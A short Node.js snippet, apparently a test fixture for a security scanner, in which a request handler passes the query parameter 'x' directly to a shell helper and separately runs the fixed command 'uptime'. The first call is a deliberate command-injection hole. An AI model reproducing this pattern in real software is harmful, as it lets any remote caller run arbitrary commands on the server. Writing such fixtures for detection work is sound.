const { sh } = require("./lib");

function handler(req, res) {
  sh(req.query.x);
  sh("uptime");
}
